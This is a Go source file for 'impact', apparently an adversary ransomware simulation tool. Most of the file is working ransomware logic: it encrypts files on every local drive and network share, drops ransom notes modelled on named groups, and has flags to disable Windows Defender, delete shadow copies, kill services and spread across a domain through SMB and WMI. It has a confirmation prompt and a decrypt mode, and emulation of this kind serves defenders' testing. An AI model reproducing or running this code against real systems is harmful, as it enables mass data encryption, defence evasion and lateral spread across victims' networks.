package main

import (
	"embed"
	"errors"
	"flag"
	"fmt"
	"github.com/abakum/embed-encrypt/encryptedfs"
	"github.com/joeavanzato/impact/drives"
	"math/rand"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync"
)

// Category - Impact Related
// TODO - Desktop Background Optional Capability
// TODO - Icon Association Optional Capability
// Category - Defense Evasion
// TODO - VSS Removals
// Category - Remote Execution
// TODO - Remote Deployment Target Spread via SMB
// TODO - Remote Execution via WMI
// TODO - Remote Execution via schtask
// TODO - Remote Execution via service control manager
// TODO - Remote Execution via mcc COM
// TODO - Remote Execution via Startup Folder
// TODO - Remote Execution via reg autostart
// Category - Health/Dev
// TODO - Revisit ECC Encryption Implementation as it's actually using AES right now and ECC keys are basically an input to this
// TODO - EDS Validation Mechanism

// go run github.com/abakum/embed-encrypt - When config updates, use this to regenerate necessary data.

//encrypted:embed config.yaml
var configFile encryptedfs.FS

// Keys will be stored by default in embedded file system
//
//go:embed *.pub
var publicKeys embed.FS
var eccKeyName = "ecc_key.ecc.pub"
var rsaKeyName = "rsa_key.rsa.pub"

var dummy_extensions = []string{"docx", "docm", "xlsm", "xlsx", "qbw", "rar", "csv", "sln", "bin", "zip", "pdf", "txt"}
var subdir_names = []string{"finance", "reports", "documents", "it", "exhibits", "backup"}
var file_names = []string{"workbook", "report", "export", "timesheet", "evidence", "knowledge", "system", "adjustment", "observable", "genuine", "certificates", "judgement", "corporate", "domain", "tempest", "research", "hypothesis", "parallel"}
var subFileNames = []string{"base", "employee", "confidential", "sensitive", "markings", "delimited", "full", "temporary", "interim", "remarkable", "explicit", "absolute", "aws", "directreport", "hr", "it", "fin", "monthly", "quarterly", "daily"}

func parseArgs(groups []RansomActor) (map[string]any, error) {
	// Target Options
	targetDirectory := flag.String("directory", "", "Target Directory - can be UNC Path (\\\\localhost\\C$\\test) or Local (C:\\test) or '*' to indicate local drive enumeration for complete targeting")
	method := flag.String("method", "inline", "inline - Read File, Encrypt in Memory, Write Modifications to Disk; outline - Read File, Encrypt to New File, Delete Original")
	recursive := flag.Bool("recursive", false, "Whether or not to encrypt all subdirs recursively or not")
	group := flag.String("group", "", "Specify a group to emulate - if none selected, will select one at random")
	list := flag.Bool("list", false, "List available groups to emulate")
	skip := flag.Bool("skipconfirm", false, "Skip Directory Confirmation Prompt (be careful!)")

	// Encryption/Decryption Parameters - will override group settings if used for encryption/decryption
	decrypt := flag.Bool("decrypt", false, "Attempt to decrypt using specified options - must include RSA Private Key and Group Name OR Cipher Used")
	sym_cipher := flag.String("cipher", "", "Specify Symmetric Cipher for Encryption/Decryption")
	encryption_percent := flag.Int("ep", 25, "Percentage of data to encrypt in each file over the 100%-auto threshold")
	threshold_auto_fullencrypt := flag.Int64("threshold", 1024, "File size in bytes to automatically encrypt 100% of the contents if file Size <= provided number")
	workers := flag.Int("workers", 25, "How many goroutines to use for encryption - think of this as a limiter for number of concurrent files that can be encrypted/decrypted")
	force_note_name := flag.String("force_note_name", "", "Force the use of a specific filename for a ransomware note")
	force_extension := flag.String("force_extension", "", "Force the use of a specific encryption extension")

	// Offensive
	killprocs := flag.Bool("killprocs", false, "Attempt to stop configured list of process binaries on the target machine prior to encryption - requires admin privileges")
	vss := flag.Bool("vss", false, "Attempt to remove all VSS copies prior to encryption - requires admin privileges")
	blockhosts := flag.Bool("blockhosts", false, "Attempt to add configured domains into hosts.etc for redirection - requires admin privileges")
	blockports := flag.Bool("blockports", false, "Attempt to add configured ports into a Windows Firewall Rule (if enabled) for blocking - requires admin privileges")
	defender := flag.Bool("defender", false, "Attempt to disable various aspects of Windows Defender when doing encryption - requires admin privileges")
	killservices := flag.Bool("killservices", false, "Attempt to stop configured list of services - requires admin privileges")

	// Targets
	var targetSlice StringSlice
	flag.Var(&targetSlice, "targets", "A comma-separated list of hostnames/IP addresses - impact will be copied to the remote device via SMB and executed via the chosen method")
	targetsFile := flag.String("targets_file", "", "Specify a file containing line-delimited hostnames/IPs to use as execution targets")
	execMethod := flag.String("exec_method", "wmi", "How to execute remote copies of impact - wmi, task, service")
	targetNetworkShares := flag.Bool("targetNetworkShares", false, "If enabled, impact will target network shares if target_dir == \"*\"")
	targetADComputers := flag.Bool("targetad", false, "If enabled, impact will target all enabled computers in the current domain - requires admin privileges")
	remoteFileCopyPath := flag.String("remotecopypath", "", "If specified, impact will be copied to this location on the remote device - if blank, will use the default ADMIN$ share")

	// Asymmetric Keys
	generate_keys := flag.Bool("generate_keys", false, "If specified, will generate new RSA/ECC keys to use for encryption/decryption purposes")
	rsa_public := flag.String("rsa_public", "", "Specify RSA Public-Key File to use - if blank, will use embedded key")
	rsa_private := flag.String("rsa_private", "", "Specify RSA Private-Key File - must be specified with decrypt if asymmetric system is RSA")
	ecc_public := flag.String("ecc_public", "", "Specify ECC Public-Key File to use - if blank, will use embedded key")
	ecc_private := flag.String("ecc_private", "", "Specify ECC Private-Key File - must be specified with decrypt if asymmetric system is ECC")

	// Dummy Data Creation Parameters
	create := flag.Bool("create", false, "Create a mixture of dummy-data files in the target directory for encryption targeting - when using this, only files created by impact will be targeted for encryption, regardless of existence")
	create_count := flag.Int("create_files", 5000, "How many dummy-files to create")
	create_size := flag.Int("create_size", 5000, "Size in megabytes of dummy-file data to target - distributed evenly across create_files count")
	flag.Parse()

	// If we are not listing threat actor templates or ge
	if *targetDirectory == "" && !*list && !*generate_keys {
		return nil, errors.New("Empty Target Directory - must specify for encryption/decryption operations")
	}

	// Don't check if it exists if we are using remote target specifications since it's not designed to run on this device anyways
	if *targetDirectory != "" && *targetDirectory != "*" && *targetsFile != "" && len(targetSlice) != 0 {
		if !doesOSEntryExist(*targetDirectory) {
			return nil, errors.New(fmt.Sprintf("Target Directory does not exist: %s", *targetDirectory))
		}
	}

	// Must use one or the other
	// inline refers to modifying a file and writing the encrypted portions back to the same file
	// outline refers to creating a new file and deleting the original
	if *method != "inline" && *method != "outline" {
		return nil, errors.New("Invalid Encryption Method - must be 'inline' or 'outline")
	}

	// validate group selection or pick random - if decrypting, this is a bad idea.
	selectedGroup := RansomActor{}
	if *group == "" {
		n := rand.Intn(len(groups))
		selectedGroup = groups[n]
	} else {
		match := false
		groupNames := ""
		for _, v := range groups {
			groupNames += fmt.Sprintf("%s | ", v.Group)
			if strings.ToLower(*group) == strings.ToLower(v.Group) {
				match = true
				selectedGroup = v
			}
		}
		if !match {
			return nil, errors.New(fmt.Sprintf("Invalid Group Name - must be one of the following: %s", groupNames))
		}
	}

	// User must specify the assymmetric cipher being used for decryption
	if *decrypt && *rsa_private == "" && *ecc_private == "" {
		return nil, errors.New(fmt.Sprintf("Must specify an RSA/ECC Private Key file when using -decrypt"))
	}

	// User must specify the symmetric cipher being used for decryption
	if *decrypt && *sym_cipher == "" && *group == "" {
		return nil, errors.New(fmt.Sprintf("Must specify group or cipher when using -decrypt"))
	}

	// User must specify what decryption mode we are using
	if *rsa_private != "" && *ecc_private != "" {
		return nil, errors.New("Cannot use rsa_private and ecc_private together - must choose only one for decryption")
	}

	// File Existence/Read Checks - if specified, we should be able to os stat them
	if *rsa_private != "" {
		if !doesOSEntryExist(*rsa_private) {
			return nil, errors.New(fmt.Sprintf("RSA Private Key File does not exist: %s", *rsa_private))
		}
	}
	if *rsa_public != "" {
		if !doesOSEntryExist(*rsa_public) {
			return nil, errors.New(fmt.Sprintf("RSA Public Key File does not exist: %s", *rsa_public))
		}
	}
	if *ecc_private != "" {
		if !doesOSEntryExist(*ecc_private) {
			return nil, errors.New(fmt.Sprintf("ECC Private Key File does not exist: %s", *ecc_private))
		}
	}
	if *ecc_public != "" {
		if !doesOSEntryExist(*ecc_public) {
			return nil, errors.New(fmt.Sprintf("ECC Public Key File does not exist: %s", *ecc_public))
		}
	}

	if (*encryption_percent > 100 || *encryption_percent <= 0) && !*decrypt {
		return nil, errors.New("Encryption Percent must be >0 and <=100")
	}

	if *threshold_auto_fullencrypt <= 0 {
		return nil, errors.New("Threshold must be >0")
	}

	if *targetsFile != "" {
		if !doesOSEntryExist(*targetsFile) {
			return nil, errors.New(fmt.Sprintf("Targets File does not exist: %s", *targetsFile))
		}
	}

	// Should not use targets and targets_file together
	if *targetsFile != "" && len(targetSlice) != 0 {
		return nil, errors.New("Cannot specify both targets and targets_file - mutually exclusive parameters")
	}

	allowedExecMethods := []string{"wmi", "task", "service"}
	if !slices.Contains(allowedExecMethods, *execMethod) {
		return nil, errors.New(fmt.Sprintf("Remote Execution Method Invalid: %s", *execMethod))
	}

	if !*decrypt && len(targetSlice) == 0 && *targetDirectory == "*" && *targetsFile == "" && !*targetADComputers {
		// Basically - if we are NOT decrypting
		// AND we are not doing any type of multi target
		// Then allow targeting of network shares
		// This helps prevent any weird concurrency/race errors when doing larger deployments
		*targetNetworkShares = true
	} else if !*decrypt && *targetDirectory == "*" && (len(targetSlice) != 0 || *targetsFile != "") {
		// We are planning to deploy impact to remote devices for targeting - network share should not be targeted as we should be targeting the device directly
		// If it's a device where impact cannot be deployed (ie isilon) then it should be targeted separately as it's own attack plan
		*targetNetworkShares = false
	}

	if *decrypt {
		// Decryption should only be on local drives, never network shares if wild-card deployment
		*targetNetworkShares = false
	}

	if *targetADComputers {
		// If we are targeting AD computers, we should not be using network shares since the assumption is impact will be deployed to the target device
		*targetNetworkShares = false
	}

	if *decrypt && *create {
		return nil, errors.New("Cannot use -decrypt and -create together")
	}

	if *create && (len(targetSlice) != 0 || *targetsFile != "") {
		return nil, errors.New("Cannot use -create and -target_file or -targets together")
	}

	arguments := map[string]any{
		"target":                     *targetDirectory,
		"method":                     *method,
		"group":                      selectedGroup,
		"list":                       *list,
		"skip":                       *skip,
		"recursive":                  *recursive,
		"create":                     *create,
		"create_count":               *create_count,
		"create_size":                *create_size,
		"workers":                    *workers,
		"rsa_public":                 *rsa_public,
		"rsa_private":                *rsa_private,
		"ecc_public":                 *ecc_public,
		"ecc_private":                *ecc_private,
		"decrypt":                    *decrypt,
		"sym_cipher":                 *sym_cipher,
		"generate_keys":              *generate_keys,
		"killprocs":                  *killprocs,
		"killservices":               *killservices, // TODO,
		"vss":                        *vss,
		"encryption_percent":         *encryption_percent,
		"threshold_auto_fullencrypt": *threshold_auto_fullencrypt,
		"exec_method":                *execMethod,          // TODO
		"targets":                    targetSlice,          // TODO
		"targets_file":               *targetsFile,         // TODO
		"targetNetworkShares":        *targetNetworkShares, // Not for manual use - network shares are auto-targeted when running locally - they are skipped when running remotely/auto-spread
		"force_note_name":            *force_note_name,     // Should only be used for when we are copying impact and launching remotely on multiple devices
		"force_extension":            *force_extension,     // Should only be used for when we are copying impact and launching remotely on multiple devices
		"blockhosts":                 *blockhosts,
		"blockports":                 *blockports,
		"defender":                   *defender,
		"targetad":                   *targetADComputers,
		"remoteFileCopyPath":         *remoteFileCopyPath,
	}

	return arguments, nil
}

func main() {

	printFormattedMessage("impact - Adversary Ransomware Simulation", INFO)
	printFormattedMessage("For Questions or Issues: github.com/joeavanzato/impact", INFO)

	isAdmin := areWeAdmin()
	config, err := ReadConfig()
	if err != nil {
		printFormattedMessage(err.Error(), ERROR)
		return
	}

	args, err := parseArgs(config.Groups)
	if err != nil {
		printFormattedMessage(err.Error(), ERROR)
		return
	}

	if args["list"].(bool) {
		ListGroupMetadata(config)
		return
	}

	decryptEnabled := args["decrypt"].(bool)
	recursiveBool := args["recursive"].(bool)
	group := args["group"].(RansomActor)
	method := args["method"].(string)
	target_dir := args["target"].(string)
	target_dir = strings.ToLower(target_dir)
	config.ThresholdFullEncrypt = args["threshold_auto_fullencrypt"].(int64)
	config.EncryptionPercent = args["encryption_percent"].(int)
	targetAD := args["targetad"].(bool)

	// File Creation
	fileList := make([]string, 0)
	if args["create"].(bool) {
		err, fileList = CreateFiles(args["create_count"].(int), args["create_size"].(int), target_dir)
		if err != nil {
			printFormattedMessage(err.Error(), ERROR)
			return
		}
		printFormattedMessage(fmt.Sprintf("Created %d Files in Target Directory: %s", len(fileList), target_dir), INFO)
		return
	}

	adTargetFile := "C:\\ProgramData\\impact_ad_targets.txt"
	if targetAD {
		err = writeEnabledADComputers(adTargetFile)
		if err != nil {
			return
		}
	}

	if args["blockports"].(bool) && isAdmin {
		// Reversible
		handlePortBlocking(decryptEnabled, &config)
	}
	if args["blockhosts"].(bool) && isAdmin {
		// Reversible
		// Probably better way is resolve these to IPs and then block the IPs in-line
		// This is tricky - we don't really want to have to do this for all domains on all devices because that could be a huge spike in DNS traffic
		// But - should we really care about DNS performance/spikes in a ransomware simulation?
		// Plus - entries will probably be cached, so oh well
		handleDomainBlocking(decryptEnabled, &config)
	}
	if args["defender"].(bool) && isAdmin {
		// Non-Reversible
		handleDefenderExclusions(decryptEnabled)
	}

	currentHostname, err := os.Hostname()
	if err != nil {
		panic(err)
	}

	groupValidationError := validateGroup(group)
	if groupValidationError != nil {
		printFormattedMessage(groupValidationError.Error(), ERROR)
		return
	}
	extension := group.Extensions[rand.Intn(len(group.Extensions))]
	if args["force_extension"].(string) != "" {
		extension = args["force_extension"].(string)
	}
	extension = replaceExtensionVariables(extension)
	note := replaceExtensionVariables(group.Note)
	noteName := group.Notes[rand.Intn(len(group.Notes))]
	if args["force_note_name"].(string) != "" {
		extension = args["force_note_name"].(string)
	}

	// Section: Asymmetric Key Setup
	asymKeys := AsymKeyHandler{
		RSAPublicKey:      nil,
		RSAPublicKeyFile:  "",
		RSAPrivateKey:     nil,
		RSAPrivateKeyFile: "",
		ECCPublicKey:      nil,
		ECCPublicKeyFile:  "",
		ECCPrivateKey:     nil,
		ECCPrivateKeyFile: "",
		System:            "",
	}
	if args["generate_keys"].(bool) {
		asymKeys, err = generateKeys()
		if err != nil {
			printFormattedMessage(err.Error(), ERROR)
		}
		return
	}
	if args["rsa_private"].(string) != "" {
		asymKeys.RSAPrivateKeyFile = args["rsa_private"].(string)
	}
	if args["rsa_public"].(string) != "" {
		asymKeys.RSAPublicKeyFile = args["rsa_public"].(string)
	}
	if args["ecc_private"].(string) != "" {
		asymKeys.ECCPrivateKeyFile = args["ecc_private"].(string)
	}
	if args["ecc_public"].(string) != "" {
		asymKeys.ECCPublicKeyFile = args["ecc_public"].(string)
	}

	// validate supplied cipher or group read
	sym_cipher := ""
	if args["sym_cipher"].(string) != "" {
		sym_cipher = strings.ToLower(args["sym_cipher"].(string))
	} else {
		sym_cipher = strings.ToLower(group.Cipher)
	}
	allowed_symmetric_ciphers := []string{"xchacha20", "aes256"}
	if !slices.Contains(allowed_symmetric_ciphers, sym_cipher) {
		printFormattedMessage(fmt.Sprintf("Symmetric Cipher not implemented: %s", sym_cipher), ERROR)
		return
	}
	asym_cipher := strings.ToLower(group.AsymCipher)
	allowed_asym_ciphers := []string{"rsa", "ecc"}
	if !slices.Contains(allowed_asym_ciphers, asym_cipher) {
		printFormattedMessage(fmt.Sprintf("Asymmetric Cipher not implemented: %s", asym_cipher), ERROR)
		return
	}
	asymKeys, err = setupKeyData(asymKeys, decryptEnabled, asym_cipher)
	if err != nil {
		printFormattedMessage(err.Error(), ERROR)
		return
	}

	// End Section: Asymmetric Key Setup

	// Check if local or remote target and get hostname if remote
	// Why does this matter?
	// There are two ways where we might want to target a machine other than the current one
	// 1 - We simply use SMB/Mapped Drives to encrypt files we have access to
	// - This works, but less flexibility for other options such as modifying registry, etc, and of course is slower
	// 2 - We copy impact to the target $ADMIN or $C share and execute it remotely via WMI
	//	- Requires SMB and WMI access - so either a Local Admin or other privileged account
	//  - We may not have this type of access so we allow both methods
	isRemoteDevice := false
	if strings.HasPrefix(target_dir, "\\\\") && !strings.Contains(strings.ToLower(target_dir), strings.ToLower(currentHostname)) && !strings.Contains(target_dir, "127.0.0.1") && !strings.Contains(strings.ToLower(target_dir), "localhost") {
		isRemoteDevice = true
	}

	remoteTargetList := make([]string, 0)
	if args["targets_file"].(string) != "" || len(args["targets"].(StringSlice)) != 0 || targetAD {
		if targetAD {
			args["targets_file"] = adTargetFile
		}
		remoteTargetList, err = GetTargetList(args)
	}
	if len(remoteTargetList) != 0 {
		handleRemoteTargets(remoteTargetList, args)
		return
	}

	// We have valid group, directory, method at this point - now we want to determine if we are creating a subdir/files to simulate with or not
	printFormattedMessage(fmt.Sprintf("Simulating Group: %s", group.Group), INFO)

	if !args["skip"].(bool) {
		var con string
		msg := ""
		if args["decrypt"].(bool) {
			if target_dir == "*" {
				msg = fmt.Sprintf("impact is about to decrypt data on all connected drives - please type 'confirm' to proceed:")
			} else {
				msg = fmt.Sprintf("impact is about to decrypt data in target directory %s - please type 'confirm' to proceed:", target_dir)
			}
		} else {
			if target_dir == "*" {
				msg = fmt.Sprintf("impact is about to encrypt data on all connected drives - please type 'confirm' to proceed:")
			} else {
				msg = fmt.Sprintf("impact is about to encrypt data in target directory %s - please type 'confirm' to proceed:", target_dir)
			}
		}
		fmt.Print(msg)
		_, err = fmt.Scan(&con)
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error scanning input: %s", err.Error()), ERROR)
			return
		}
		if con != "confirm" {
			printFormattedMessage(fmt.Sprintf("Abandoning Execution due to lack of confirmation: %s", con), ERROR)
			return
		}
	}

	generateDecryptInstructions(target_dir, asymKeys, sym_cipher, recursiveBool, noteName)

	if !decryptEnabled {
		// VSS Removals
		// Process Kills
		preEncryptionChecks(args, isAdmin, isRemoteDevice, config, decryptEnabled)
	}

	err = setupRegex(config)
	if err != nil {
		printFormattedMessage(err.Error(), ERROR)
		return
	}

	// Now we are ready to actually start encryption/decryption
	var ewg sync.WaitGroup
	fileTargetChannel := make(chan File)
	// ewg is closed once all workers are finished encrypting, fileTargetChannel is closed once all files have been pushed to the channel
	for i := 0; i < args["workers"].(int); i++ {
		ewg.Add(1)
		go encryptionWorker(fileTargetChannel, &ewg, noteName, method, sym_cipher, extension, asymKeys, decryptEnabled, group, config)
	}

	immediateNote := true
	if group.NoteBehavior == "delayed" {
		immediateNote = false
	}
	findFileTargets(target_dir, note, noteName, recursiveBool, fileList, fileTargetChannel, args["decrypt"].(bool), &config, immediateNote, args)
	ewg.Wait()
}

func findFileTargets(targetDir string, note string, noteName string, recursive bool, fileList []string, c chan File, decryptEnabled bool, config *Config, immediateNote bool, args map[string]any) {
	// Each unique directory that we encounter, including base, should receive a ransomware note creation
	// If len(fileList) == 0, we did NOT create files explicitly for this test and as such, will be flat-scanning or recursively iterating
	// Flat scanning is easy - we can populate right now

	// Basically, if we specify * as target directory, we want to just blast everything possible
	// This means that we must use findFileTargets multiple times, each time setting our target directory as the base
	// The implementation below does work, even for network drives - so probably we can just leave it at that
	// But below is hard to distinguish logical from network drives
	defer close(c)
	logicalDisks := make([]string, 0)
	if targetDir == "*" {
		//enumerateDrives()
		//logicalDisks = GetLogicalDriveLetters()
		disks, err := drives.GetLocalDrives()
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error getting local drives: %v", err), ERROR)
			return
		}
		for _, v := range disks {
			logicalDisks = append(logicalDisks, v.Name)
		}

		if args["targetNetworkShares"].(bool) {
			networkShares, err := drives.GetNetworkShares()
			if err != nil {
				printFormattedMessage(fmt.Sprintf("Error getting network drives: %v", err), ERROR)
			} else {
				for _, v := range networkShares {
					logicalDisks = append(logicalDisks, v.MountPoint)
				}
			}
		}

	}
	immediateNoteCreation := immediateNote
	ransomwareNoteDirs := make([]string, 0)

	if !recursive && len(fileList) == 0 {
		// We have not created any files to encrypt and just want top-level
		fileList, _ = gatherFiles(fileList, recursive, targetDir)
	}
	if len(fileList) != 0 {
		// We have populated file-list - either from top-level or created files
		// We won't filter if it's non-recursive, just do all since we assume it's highly targeted for a reason
		for _, v := range fileList {
			baseDir := filepath.Dir(v)
			if !slices.Contains(ransomwareNoteDirs, baseDir) && !decryptEnabled && immediateNoteCreation {
				createNote(note, noteName, baseDir)
				ransomwareNoteDirs = append(ransomwareNoteDirs, baseDir)
			} else if !immediateNoteCreation {
				ransomwareNoteDirs = append(ransomwareNoteDirs, baseDir)
			}
			i, err := os.Stat(v)
			if err != nil {
				continue
			}
			f := File{
				Path: v,
				Size: i.Size(),
			}
			c <- f
		}
	} else if recursive {

		if targetDir == "*" {
			// Iterate all drives for encryption
			for _, v := range logicalDisks {
				targetDir = fmt.Sprintf("%s\\", v)
				// Mutex Checks
				mutexFile := filepath.Join(targetDir, config.UniqueFileMutex)
				if doesOSEntryExist(mutexFile) && !decryptEnabled {
					printFormattedMessage(fmt.Sprintf("Mutex file exists in %s - skipping encryption", targetDir), INFO)
					continue
				} else if !doesOSEntryExist(mutexFile) && decryptEnabled {
					printFormattedMessage(fmt.Sprintf("Mutex file does not exist in %s - skipping decryption", targetDir), INFO)
					continue
				}
				if !decryptEnabled {
					err := CreateEncryptionSignature(mutexFile)
					if err != nil {
						// If we can't create a file here than we should not be encrypting anyways because it will not be possible
						continue
					}
				} else if decryptEnabled {
					err := DeleteEncryptionSignature(mutexFile)
					if err != nil {
						// Try to decrypt anyways
					}
				}

				filepath.Walk(targetDir,
					func(path string, info os.FileInfo, err error) error {
						if err != nil {
							return nil
						}
						if info.IsDir() && !shouldProcessDirectory(path, config) {
							// This should result in skipping the directory entirely
							return filepath.SkipDir
						}
						// If V is a network share, we may accidentally have multiple devices encrypting it
						// How do we check if this folder is already encrypted?  Check if ransomware note exists
						if info.IsDir() {
							if doesOSEntryExist(filepath.Join(path, noteName)) && !decryptEnabled {
								// This directory has already been encrypted
								return filepath.SkipDir
							}
							return nil
						}
						if info.Size() == 0 {
							return nil
						}

						// Only do filters if we are encrypting, not decrypting - decrypt process checks for signature to determine if a file needs to be decrypted
						if !decryptEnabled {
							if !shouldProcessFile(path, config) {
								return nil
							}
						}

						//fmt.Println(filepath.Ext(path))
						// If we haven't yet created a ransomware note in the current directory, create one
						baseDir := filepath.Dir(path)
						if !slices.Contains(ransomwareNoteDirs, baseDir) && !decryptEnabled && immediateNoteCreation {
							createNote(note, noteName, baseDir)
							ransomwareNoteDirs = append(ransomwareNoteDirs, baseDir)
						} else if !immediateNoteCreation {
							ransomwareNoteDirs = append(ransomwareNoteDirs, baseDir)
						}
						f := File{
							Path: path,
							Size: info.Size(),
						}
						c <- f
						return nil
					})
			}
		} else {
			// Mutex Checks
			mutexFile := filepath.Join(targetDir, config.UniqueFileMutex)
			if doesOSEntryExist(mutexFile) && !decryptEnabled {
				printFormattedMessage(fmt.Sprintf("Mutex file exists in %s - skipping encryption", targetDir), INFO)
				return
			} else if !doesOSEntryExist(mutexFile) && decryptEnabled {
				printFormattedMessage(fmt.Sprintf("Mutex file does not exist in %s - skipping decryption", targetDir), INFO)
				return
			}
			if !decryptEnabled {
				err := CreateEncryptionSignature(mutexFile)
				if err != nil {
					// If we can't create a file here than we should not be encrypting anyways because it will not be possible
					return
				}
			} else if decryptEnabled {
				err := DeleteEncryptionSignature(mutexFile)
				if err != nil {
					// Try to decrypt anyways
				}
			}
			filepath.Walk(targetDir,
				func(path string, info os.FileInfo, err error) error {
					if err != nil {
						return nil
					}
					if info.IsDir() && !shouldProcessDirectory(path, config) {
						// This should result in skipping the directory entirely
						return filepath.SkipDir
					}
					if info.IsDir() {
						if doesOSEntryExist(filepath.Join(path, noteName)) && !decryptEnabled {
							// This directory has already been encrypted
							return filepath.SkipDir
						}
						return nil
					}
					if info.Size() == 0 {
						return nil
					}

					// Only do filters if we are encrypting, not decrypting - decrypt process checks for signature to determine if a file needs to be decrypted
					if !decryptEnabled {
						if !shouldProcessFile(path, config) {
							return nil
						}
					}

					//fmt.Println(filepath.Ext(path))
					// If we haven't yet created a ransomware note in the current directory, create one
					baseDir := filepath.Dir(path)
					if !slices.Contains(ransomwareNoteDirs, baseDir) && !decryptEnabled && immediateNoteCreation {
						createNote(note, noteName, baseDir)
						ransomwareNoteDirs = append(ransomwareNoteDirs, baseDir)
					} else if !immediateNoteCreation {
						ransomwareNoteDirs = append(ransomwareNoteDirs, baseDir)
					}
					f := File{
						Path: path,
						Size: info.Size(),
					}
					c <- f
					return nil
				})
		}

	}
	if !immediateNoteCreation {
		// Delayed notes
		for _, v := range ransomwareNoteDirs {
			createNote(note, noteName, v)
		}
	}
}
